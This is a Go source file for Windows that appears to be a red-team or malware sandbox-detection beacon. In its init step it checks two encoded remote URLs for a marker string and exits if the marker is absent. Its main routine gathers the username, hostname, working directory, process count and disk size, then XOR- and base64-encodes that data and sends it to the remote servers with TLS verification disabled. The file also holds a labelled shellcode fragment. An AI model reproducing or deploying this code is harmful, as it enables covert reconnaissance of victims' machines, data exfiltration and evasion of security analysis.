package main

import (
	"crypto/tls"
	"encoding/base64"
	"github.com/mattn/go-ieproxy"
	"github.com/pkg/errors"
	"io/ioutil"
	//"net"
	"net/http"
	"net/url"
	"time"

	//"encoding/base64"
	//"math"
	"strconv"
	"strings"

	"os"
	//"time"
	//"strconv"
	"os/user"
	"path/filepath"
	//"strings"
	"syscall"
	"unsafe"
)


type PROCESSENTRY32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

var (
	kernel322                = syscall.NewLazyDLL("kernel32.dll")
	CreateToolhelp32Snapshot = kernel322.NewProc("CreateToolhelp32Snapshot")
	Process32First           = kernel322.NewProc("Process32FirstW")
	Process32Next            = kernel322.NewProc("Process32NextW")
	CloseHandle              = kernel322.NewProc("CloseHandle")
)

var (
//恶意字段
	test = []string{
		"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00",
	}
)

func init() {
	ieproxy.OverrideEnvWithStaticProxy()
	check()
}

func check(){
	resp, _ := get(_url("/check"), http.ProxyFromEnvironment)
	resp1, _ := get(_url0("/check"), http.ProxyFromEnvironment)
	if !strings.Contains(string(resp), "FuckSandBox") {
		if !strings.Contains(string(resp1), "FuckSandBox") {
			os.Exit(1)
		}
	}
}


func checkUserName() string {
	username, _ := user.Current()
	return strings.ToLower(username.Username)
}

func checkFileName() string {
	actualName := filepath.Base(os.Args[0])
	return actualName
}

func checkPath() string {
	dir,_ := os.Getwd()
	return dir
}

func checkProcessNum() string {
	hProcessSnap, _, _ := CreateToolhelp32Snapshot.Call(2, 0)
	if hProcessSnap < 0 {
		return "NULL"
	}
	defer CloseHandle.Call(hProcessSnap)

	exeNames := make([]string, 0, 100)
	var pe32 PROCESSENTRY32
	pe32.dwSize = uint32(unsafe.Sizeof(pe32))

	Process32First.Call(hProcessSnap, uintptr(unsafe.Pointer(&pe32)))

	for {

		exeNames = append(exeNames, syscall.UTF16ToString(pe32.szExeFile[:260]))

		retVal, _, _ := Process32Next.Call(hProcessSnap, uintptr(unsafe.Pointer(&pe32)))
		if retVal == 0 {
			break
		}

	}
	runningProcesses := 0
	for range exeNames {
		runningProcesses += 1
	}
	return strconv.Itoa(runningProcesses)
}

func checkDiskSize() string {
	var (
		getDiskFreeSpaceEx = kernel322.NewProc("GetDiskFreeSpaceExW")
		lpFreeBytesAvailable, lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes int64
	)

	getDiskFreeSpaceEx.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:"))),
		uintptr(unsafe.Pointer(&lpFreeBytesAvailable)),
		uintptr(unsafe.Pointer(&lpTotalNumberOfBytes)),
		uintptr(unsafe.Pointer(&lpTotalNumberOfFreeBytes)))

	diskSizeGB := float32(lpTotalNumberOfBytes) / 1073741824

	return strconv.Itoa(int(diskSizeGB))
}
func checkHostName() string {

	hostname, errorout := os.Hostname()
	if errorout != nil {
		os.Exit(1)
	}

	return hostname
}



//编码后的url根路径
func _url(file string) string {
	xor := Xor{}
	return xor.dec("") + file
}
//编码后的url根路径
func _url0(file string) string {
	xor := Xor{}
	return xor.dec("") + file
}

func get(url string, proxy func(r *http.Request) (*url.URL, error)) ([]byte, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, errors.WithMessage(err, "new request failed")
	}

	cli := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           proxy,
		},
		Timeout: 30 * time.Second, // todo: 可以自己改
	}


	resp, err := cli.Do(req)
	if err != nil {
		return nil, errors.WithMessage(err, "request failed")
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		return nil, errors.New("code is not StatusOK!")
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, errors.WithMessage(err, "read data from resp.Body failed")
	}
	return bodyBytes, nil
}

func GetData(Simple string) {
	_, err := get(_url("/Simpletest?SimpleFuck="+Simple), http.ProxyFromEnvironment)
	if err != nil {
		return
	}
}

func GetData0(Simple string) {
	_, err := get(_url0("/Simpletest?SimpleFuck="+Simple), http.ProxyFromEnvironment)
	if err != nil {
		return
	}
}





func main(){

	xor := Xor{}
	Uname := checkUserName()
	Fname := checkFileName()
	Pnum := checkProcessNum()
	Hname := checkHostName()
	Dsize := checkDiskSize()
	Path := checkPath()
	Simple := "Username: "+Uname +"\n"+"Pwd: "+Path+"\n"+"Filename: "+Fname+"\n"+"processnum: "+Pnum+"\n"+"Hostname: "+Hname+"\n"+"Disksize: "+Dsize+"GB"

	//fmt.Println(Simple)

	strbytes := []byte(xor.enc(Simple))
	//fmt.Println(base64.StdEncoding.EncodeToString(strbytes))
	GetData(base64.StdEncoding.EncodeToString(strbytes))
	GetData0(base64.StdEncoding.EncodeToString(strbytes))
	//fmt.Println(base64.StdEncoding.EncodeToString(strbytes))
	//GetData("test")

}
